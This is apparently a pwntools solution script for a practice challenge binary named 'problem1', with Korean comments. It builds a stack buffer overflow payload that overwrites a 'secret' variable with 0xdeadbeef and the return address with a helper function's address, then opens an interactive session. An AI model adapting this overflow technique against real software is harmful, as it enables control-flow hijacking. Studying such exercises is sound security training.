from pwn import *

p = process("./problem1")

helper = 0x4006a7

payload = b'A'*128         # buf를 A로 다 채워줌
payload += b'B'*0xc        # buf와 secret 사이의 빈공간을 채워줌    
payload += p32(0xdeadbeef) # secret을 0xdeadbeef로 덮어줌
payload += b'C'*0x8        # main sfp를 CCCCCCCC로 덮어줌
payload += p64(helper)     # main ret를 helper의 주소로 덮어줌
p.sendline(payload)

p.interactive()